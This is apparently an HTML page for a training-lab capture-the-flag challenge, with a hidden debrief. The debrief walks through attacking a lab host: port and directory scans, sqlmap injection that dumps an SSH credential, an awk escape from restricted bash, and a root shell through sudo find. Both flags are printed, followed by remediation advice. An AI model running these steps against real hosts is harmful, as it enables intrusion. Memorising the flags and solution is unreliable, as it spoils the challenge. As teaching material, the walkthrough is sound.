@@ -1,0 +1,377 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Atlas Mission Control — Challenge 02 Night Wharf">
+  <title>Atlas Mission Control — Night Wharf</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <script src="/static/app.js" defer></script>
+</head>
+<body>
+  <main class="site-shell">
+    <div class="noise" aria-hidden="true"></div>
+    <header class="topbar">
+      <button class="brand" data-view-target="mission" aria-label="Atlas Mission Control home">
+        <span class="brand-mark"><i></i><i></i><i></i></span>
+        <span><strong>ATLAS</strong><small>VULNSEC ACADEMY</small></span>
+      </button>
+      <div class="topbar-center"><span>MODULE 08</span><b>INTEGRATED CHALLENGE</b></div>
+      <div class="environment-pill"><span class="pulse-dot"></span><span><small>ENVIRONMENT</small><strong id="environment-status">CONNECTING</strong></span></div>
+    </header>
+
+    <div class="workspace">
+      <aside class="rail" aria-label="Mission navigation">
+        <div class="rail-label">TRACE // 05</div>
+        <nav>
+          <button class="active" data-view-target="mission"><span>01</span><i></i><em>Briefing</em></button>
+          <button data-view-target="investigation"><span>02</span><i></i><em>Flags</em></button>
+          <button data-view-target="walkthrough"><span>03</span><i></i><em>Debrief</em></button>
+        </nav>
+        <div class="rail-progress">
+          <div><span>PROGRESS</span><b id="progress-percent">0%</b></div>
+          <div class="progress-track"><i id="progress-bar"></i></div>
+          <small id="progress-copy">0 / 2 flags accepted</small>
+        </div>
+      </aside>
+
+      <section class="content">
+        <section class="view-enter" data-view="mission">
+          <section class="mission-hero">
+            <div class="hero-copy">
+              <div class="kicker"><span>LAB 05</span><i></i> CHALLENGE</div>
+              <h1>NIGHT<br><em>WHARF</em></h1>
+              <p>A Northline field host is in scope. The public face is not the whole machine. Enumerate it, recover a foothold, and leave with both flags. Atlas will not grade intermediate findings — only user and root.</p>
+              <div class="hero-actions">
+                <button class="primary-button" data-view-target="investigation">Open flag drop <span>→</span></button>
+                <span class="time-chip">◷ &nbsp; 60–90 MIN</span>
+              </div>
+            </div>
+            <div class="radar-card" aria-label="Stylized lab network map">
+              <div class="radar-grid"></div>
+              <div class="radar-ring ring-one"></div>
+              <div class="radar-ring ring-two"></div>
+              <div class="radar-ring ring-three"></div>
+              <div class="radar-sweep"></div>
+              <div class="node kali-node"><i></i>KALI<small>OPERATOR</small></div>
+              <div class="node target-node"><i></i><span data-target>10.23.54.163</span><small>FIELD NODE</small></div>
+              <div class="radar-caption"><span>LIVE TOPOLOGY</span><b>TARGET ASSIGNED</b></div>
+            </div>
+          </section>
+
+          <section class="mission-grid">
+            <article class="brief-card coordinates-card">
+              <div class="card-number">01</div>
+              <p class="section-label">NETWORK COORDINATES</p>
+              <div class="coordinate-row"><span>TARGET HOST</span><code data-target>10.23.54.163</code></div>
+              <div class="coordinate-row"><span>SCOPE</span><code>all services on this host</code></div>
+              <div class="coordinate-row"><span>ATLAS ACCEPTS</span><code>user + root flags</code></div>
+              <div class="scope-warning"><b>!</b><span>No question trail. Reconnaissance is part of the job.</span></div>
+            </article>
+            <article class="brief-card objectives-card">
+              <div class="card-number">02</div>
+              <p class="section-label">MISSION OBJECTIVES</p>
+              <ol>
+                <li><span>01</span>Map the host and read what it publishes</li>
+                <li><span>02</span>Find the surface that is not linked</li>
+                <li><span>03</span>Recover a foothold on the field node</li>
+                <li><span>04</span>Submit user.txt and root.txt</li>
+              </ol>
+            </article>
+            <article class="brief-card loadout-card">
+              <div class="card-number">03</div>
+              <p class="section-label">OPERATOR LOADOUT</p>
+              <div class="tool-row"><span class="tool-icon">N</span><span><b>Nmap</b><small>Full service map</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">F</span><span><b>Fuzzer</b><small>gobuster / ffuf</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">S</span><span><b>sqlmap + SSH</b><small>Then the box itself</small></span><i>READY</i></div>
+            </article>
+          </section>
+        </section>
+
+        <section class="investigation-layout view-enter is-hidden" data-view="investigation">
+          <section class="investigation-main">
+            <div class="view-heading">
+              <div>
+                <p class="section-label">FLAG DROP</p>
+                <h2>Proof only.</h2>
+              </div>
+              <span id="cleared-copy">0/2 FLAGS</span>
+            </div>
+            <div class="question-stack" id="question-stack" aria-live="polite"></div>
+          </section>
+          <aside class="intel-panel">
+            <div class="intel-head"><span class="pulse-dot"></span><b>OPERATOR INTEL</b></div>
+            <div class="intel-stat"><span>LAB STATUS</span><strong id="intel-status">CONNECTING</strong></div>
+            <div class="intel-stat"><span>CURRENT PHASE</span><strong id="current-phase">01 / USER FLAG</strong></div>
+            <div class="intel-stat"><span>USER FLAG</span><strong id="intel-user">PENDING</strong></div>
+            <div class="intel-stat"><span>ROOT FLAG</span><strong id="intel-root">PENDING</strong></div>
+            <div class="intel-stat is-hidden"><span>HINTS USED</span><strong id="hints-used">00</strong></div>
+            <div class="mini-progress"><i id="mini-progress"></i></div>
+            <p>No stepwise questions. Atlas only checks the two flags.</p>
+            <p class="preview-link is-hidden" id="preview-target-link">Preview mode: the public site is at <a href="/site/">/site/</a>. SSH is not available in this preview.</p>
+            <button class="primary-button compact is-hidden" id="open-debrief">Open debrief →</button>
+          </aside>
+        </section>
+
+        <section class="walkthrough view-enter is-hidden" data-view="walkthrough">
+          <section class="locked-walkthrough" id="walkthrough-lock">
+            <div class="lock-orbit"><span>03</span></div>
+            <p class="section-label">DEBRIEF LOCKED</p>
+            <h2>This is a challenge.</h2>
+            <p>The walkthrough names every hidden path, payload, escape, and both flags. Submit user and root to unlock it, or reveal it if you are genuinely stuck.</p>
+            <div>
+              <button class="primary-button" data-view-target="investigation">Return to flag drop <span>→</span></button>
+              <button class="ghost-button" id="reveal-walkthrough">Reveal full walkthrough</button>
+            </div>
+          </section>
+
+          <div class="is-hidden" id="walkthrough-content">
+            <div class="view-heading walkthrough-heading">
+              <div>
+                <p class="section-label">MISSION DEBRIEF</p>
+                <h2>From a brochure to root.</h2>
+              </div>
+              <span id="walkthrough-badge" class="success-badge">MISSION COMPLETE</span>
+            </div>
+
+            <section class="debrief-summary">
+              <div><span>01</span><p>MAP</p><b>22 + 80</b></div>
+              <i>→</i>
+              <div><span>02</span><p>FUZZ</p><b>/remote/api</b></div>
+              <i>→</i>
+              <div><span>03</span><p>ENUM</p><b>rbash + bin/</b></div>
+              <i>→</i>
+              <div><span>04</span><p>GTFO</p><b>awk → find</b></div>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">01</span>
+                <p class="section-label">SERVICE MAP</p>
+                <h3>Do not assume it is only a website.</h3>
+                <p>Scan the assigned host. HTTP and SSH are both live. The SSH banner names a field node — that matters later.</p>
+                <div class="explain-list">
+                  <div><code>-sV</code><span>Service and version</span></div>
+                  <div><code>-p-</code><span>Optional full port sweep</span></div>
+                  <div><code>22/80</code><span>Both are in scope</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — zsh</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><span>┌──(operator㉿kali)-[~]</span><br><b>└─$</b> nmap -Pn -sV -p22,80 10.23.54.163</div>
+                  <div class="terminal-output">
+                    <div class="hot">22/tcp open  ssh     OpenSSH</div>
+                    <div class="hot">80/tcp open  http    Python</div>
+                    <div class="muted">SSH banner: Northline Field Node</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Browse the site. Read the news. The public pages do not link the exploit.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step reverse">
+              <div class="step-copy">
+                <span class="step-number">02</span>
+                <p class="section-label">READ, THEN FUZZ</p>
+                <h3>The brochure is a source, not the prize.</h3>
+                <p>The cutover article names unit <code>NL-7719</code>. Operations source mentions the remote field board is unpublished. <code>robots.txt</code> points at decoys (<code>/intranet-2019/</code>, <code>/staff-old/</code>, <code>/backup/</code>). <code>/intranet</code> is a parameterized dead end. Directory-fuzz the web root.</p>
+                <div class="explain-list">
+                  <div><code>NL-7719</code><span>Valid unit id, from the news</span></div>
+                  <div><code>/remote/</code><span>Hidden splash — no form</span></div>
+                  <div><code>/remote/api</code><span>Second fuzz from that folder</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — zsh</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><span>┌──(operator㉿kali)-[~]</span><br><b>└─$</b> gobuster dir -u http://10.23.54.163 -w /usr/share/wordlists/dirb/common.txt</div>
+                  <div class="terminal-output">
+                    <div>/intranet     (Status: 200)</div>
+                    <div class="hot">/remote    (Status: 200)</div>
+                    <div>/robots.txt   (Status: 200)</div>
+                  </div>
+                  <div class="command-line"><span>┌──(operator㉿kali)-[~]</span><br><b>└─$</b> gobuster dir -u http://10.23.54.163/remote -w /usr/share/wordlists/dirb/common.txt</div>
+                  <div class="terminal-output">
+                    <div class="hot">/api          (Status: 200)</div>
+                    <div class="muted">{"error":"missing id"}</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>curl '/remote/api?id=NL-7719' returns the live unit JSON.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">03</span>
+                <p class="section-label">SQLMAP</p>
+                <h3>The API concatenates id.</h3>
+                <p>Point sqlmap at a known-good identifier. Dump <code>operators</code>. The <code>access</code> column tells you who may use the field node.</p>
+                <div class="explain-list">
+                  <div><code>id</code><span>Unsafe GET parameter</span></div>
+                  <div><code>operators</code><span>Credential table</span></div>
+                  <div><code>j.reeves / ssh</code><span>The account that answers on port 22</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — zsh</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><span>┌──(operator㉿kali)-[~]</span><br><b>└─$</b> sqlmap -u "http://10.23.54.163/remote/api?id=NL-7719" --batch --tables</div>
+                  <div class="terminal-output">
+                    <div>contractors</div>
+                    <div class="hot">operators</div>
+                    <div>units</div>
+                  </div>
+                  <div class="command-line"><span>┌──(operator㉿kali)-[~]</span><br><b>└─$</b> sqlmap -u "http://10.23.54.163/remote/api?id=NL-7719" --batch -T operators --dump</div>
+                  <div class="terminal-output">
+                    <div>m.hale          stores    none</div>
+                    <div class="hot">j.reeves        field     ssh    Dockline-1904</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Intranet login with these creds is a dead end. Use SSH.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step reverse">
+              <div class="step-copy">
+                <span class="step-number">04</span>
+                <p class="section-label">ENUMERATE THE SHELL</p>
+                <h3>Do not assume which cage you are in.</h3>
+                <p>SSH only gives a prompt. Identify the shell, list what you can run, and record what fails. A private <code>PATH</code>, a refused <code>cd</code>, and a refused command that contains a slash is the signature of restricted bash (<code>rbash</code>) — not a broken install.</p>
+                <div class="explain-list">
+                  <div><code>echo $0 $SHELL</code><span>Names the login shell</span></div>
+                  <div><code>echo $PATH && ls bin</code><span>Every binary you are allowed</span></div>
+                  <div><code>cd /</code><span>Refused — confirms the cage</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>field node</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><span>┌──(operator㉿kali)-[~]</span><br><b>└─$</b> ssh j.reeves@10.23.54.163</div>
+                  <div class="terminal-output">
+                    <div class="muted">password: Dockline-1904</div>
+                    <div>$ echo $0</div>
+                    <div class="hot">-rbash</div>
+                    <div>$ echo $SHELL</div>
+                    <div class="hot">/bin/rbash</div>
+                    <div>$ echo $PATH</div>
+                    <div class="hot">/home/j.reeves/bin</div>
+                    <div>$ ls</div>
+                    <div>bin  user.txt</div>
+                    <div>$ cat user.txt</div>
+                    <div class="flag">SQLI{night_wharf_user_reeves}</div>
+                    <div>$ ls bin</div>
+                    <div class="hot">awk  cat  date  echo  ls  pwd  whoami</div>
+                    <div>$ cd /</div>
+                    <div class="muted">-rbash: cd: restricted</div>
+                    <div>$ /bin/bash</div>
+                    <div class="muted">-rbash: /bin/bash: restricted: cannot specify `/' in command names</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>You have a user flag and a short allow-list. Next stop is GTFOBins, not guesswork.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">05</span>
+                <p class="section-label">GTFOBINS ESCAPE</p>
+                <h3>Look up every allowed binary.</h3>
+                <p>Open <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins.github.io</a> and search the allow-list one name at a time. <code>ls</code>, <code>cat</code>, <code>echo</code>, <code>pwd</code>, <code>date</code> and <code>whoami</code> have no shell escape that helps inside rbash. <code>awk</code> does — it can call <code>system()</code> and start a real bash. After that, this shell still inherited the tiny <code>PATH</code>, so reset it before you try <code>sudo</code>.</p>
+                <div class="explain-list">
+                  <div><code>awk</code><span>GTFOBins → Shell</span></div>
+                  <div><code>system("/bin/bash")</code><span>Leaves rbash</span></div>
+                  <div><code>export PATH=...</code><span>Unhides sudo, find, id</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>field node</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> awk 'BEGIN {system("/bin/bash")}'</div>
+                  <div class="terminal-output">
+                    <div class="muted"># prompt changes — this is no longer rbash</div>
+                    <div>j.reeves@night-wharf:~$ echo $0</div>
+                    <div class="hot">bash</div>
+                    <div>j.reeves@night-wharf:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</div>
+                    <div>j.reeves@night-wharf:~$ which sudo find</div>
+                    <div>/usr/bin/sudo</div>
+                    <div>/usr/bin/find</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Same GTFOBins page you will use again for sudo find.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step reverse">
+              <div class="step-copy">
+                <span class="step-number">06</span>
+                <p class="section-label">PRIVILEGE ESCALATION</p>
+                <h3>Enumerate sudo the same way.</h3>
+                <p>Do not hunt random SUID binaries first. Ask sudo what this account may run. <code>sudo -l</code> returns a single NOPASSWD path: <code>/usr/bin/find</code>. GTFOBins → find → Sudo is a root shell. Then read <code>/root/root.txt</code>.</p>
+                <div class="explain-list">
+                  <div><code>sudo -l</code><span>Do not skip this — it names the binary</span></div>
+                  <div><code>gtfobins / find</code><span>Sudo function is a root shell</span></div>
+                  <div><code>/root/root.txt</code><span>Second flag</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>field node</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> sudo -l</div>
+                  <div class="terminal-output">
+                    <div class="muted">User j.reeves may run the following commands:</div>
+                    <div class="hot">(root) NOPASSWD: /usr/bin/find</div>
+                    <div class="muted"># gtfobins.github.io → find → Sudo</div>
+                  </div>
+                  <div class="command-line"><b>$</b> sudo find / -name root.txt -exec cat {} \;</div>
+                  <div class="terminal-output">
+                    <div class="flag">SQLI{night_wharf_root_hold}</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Or: sudo find . -exec /bin/sh \; -quit</figcaption>
+              </figure>
+            </section>
+
+            <section class="completion-card">
+              <div>
+                <span>TRACE // 05</span>
+                <h3>Wharf taken.</h3>
+                <p>You mapped both services, fuzzed twice, recovered SSH, enumerated the rbash allow-list, escaped with awk from GTFOBins, then used sudo find the same way.</p>
+              </div>
+              <div class="completion-stats">
+                <span><small>FLAGS</small><b id="completion-objectives">02 / 02</b></span>
+                <span><small>HINTS USED</small><b id="completion-hints">00</b></span>
+              </div>
+              <button class="ghost-button" id="repeat-mission">Repeat mission</button>
+            </section>
+
+            <section class="walkthrough-step last-step">
+              <div class="step-copy">
+                <span class="step-number">R</span>
+                <p class="section-label">REMEDIATION</p>
+                <h3>Every hop was optional.</h3>
+                <p>Do not leave unpublished APIs on the same host as SSH. Bind the unit query. Do not put passwords next to an <code>ssh</code> column. Restricted shells need a tight allowed-command list — <code>awk</code> is a shell. <code>find</code> with sudo is a root shell.</p>
+              </div>
+            </section>
+          </div>
+        </section>
+      </section>
+    </div>
+  </main>
+
+  <dialog class="spoiler-dialog" id="walkthrough-confirm" aria-labelledby="walkthrough-confirm-title" aria-describedby="walkthrough-confirm-copy">
+    <div class="spoiler-dialog-card">
+      <div class="spoiler-icon" aria-hidden="true">!</div>
+      <p class="section-label">SPOILER WARNING</p>
+      <h2 id="walkthrough-confirm-title">Reveal the full walkthrough?</h2>
+      <p id="walkthrough-confirm-copy">This will expose every hidden path, payload, escape, and both flags. Your debrief will be marked <strong>SOLUTION REVEALED</strong>.</p>
+      <div class="spoiler-dialog-actions">
+        <button class="ghost-button" id="cancel-walkthrough-reveal" type="button">Cancel — keep trying</button>
+        <button class="danger-button" id="confirm-walkthrough-reveal" type="button">Reveal anyway</button>
+      </div>
+      <small>There is no hint ladder on this challenge — only this debrief.</small>
+    </div>
+  </dialog>
+  <div class="portal-error is-hidden" id="portal-error" role="alert"><b>MISSION CONTROL OFFLINE</b><span>Start or reset the lab, then reload this page.</span></div>
+</body>
+</html>
